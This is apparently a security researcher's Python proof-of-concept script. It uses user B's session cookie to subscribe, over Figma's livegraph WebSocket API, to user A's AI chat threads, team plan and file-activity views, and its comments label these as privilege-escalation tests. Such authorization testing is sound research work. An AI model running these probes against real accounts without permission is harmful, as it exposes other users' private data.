# -*- coding: utf-8 -*-
"""带真实 cookie 的 WS 握手:验证 B 身份 + 订阅 A 资源
对比:无 cookie(匿名)vs 带 COOKIE_B(B 身份)
"""
import json, time, websocket, sys
sys.path.insert(0, 'D:/scan/figma_report')
from _figma_creds import UID_A, UID_B, FILE_A, FILE_B, TEAM_A, COOKIE_B

CLIENT_URL = 'https://www.figma.com/file/%s' % FILE_A

def conn(view_name, args, label, userId, cookie_header=None, extra_headers=None):
    url = ('wss://www.figma.com/api/livegraph?pv=1&userId=%s&anonUserId=&clientType=web'
           '&preload=%%7B%%7D&requestedProtocolVersion=2&clientUrl=%s&connectionType=initial&reconnect=0'
           % (userId, CLIENT_URL))
    hdrs = ['User-Agent: Mozilla/5.0']
    if cookie_header:
        hdrs.append('Cookie: ' + cookie_header)
    if extra_headers:
        hdrs.extend(extra_headers)
    ws = websocket.create_connection(url, timeout=10, header=hdrs)
    ws.send(json.dumps({'messageType': 'auth', 'clientType': 'web',
                        'args': {'userId': userId, 'anonymousUserId': None},
                        'tags': {'clientType': 'web', 'clientUrl': CLIENT_URL},
                        'clientRequestedVersion': 2}))
    time.sleep(0.4)
    ws.send(json.dumps({'messageType': 'subscribe', 'viewName': view_name,
                        'viewHash': 'abababababababababababababababab',
                        'loadType': 'initial', 'args': args}))
    msgs = []
    ws.settimeout(5)
    try:
        while True:
            msgs.append(ws.recv())
    except Exception:
        pass
    ws.close()
    print('=== %s ===' % label)
    for m in msgs:
        print('  ', m[:650].replace('\n', ' '))
    print()

# 1. 带 COOKIE_B:B 身份订阅自己的资源(验证身份生效)
conn('PaginatedUserAiChatThreadsView',
     {'firstPageSize': 10, 'ownerId': UID_B, 'userId': UID_B},
     'cookie=B身份 订阅B的AI线程',
     UID_B, COOKIE_B)
# 2. 带 COOKIE_B:B 身份订阅 A 的资源
conn('PaginatedUserAiChatThreadsView',
     {'firstPageSize': 10, 'ownerId': UID_A, 'userId': UID_A},
     'cookie=B身份 订阅A的AI线程(越权测试)',
     UID_B, COOKIE_B)
conn('TeamByIdForPlanView', {'teamId': TEAM_A},
     'cookie=B身份 订阅A团队plan(越权测试)',
     UID_B, COOKIE_B)
conn('ActiveFileUsersForFileView', {'fileKey': FILE_A},
     'cookie=B身份 订阅A文件活跃用户(越权测试)',
     UID_B, COOKIE_B)
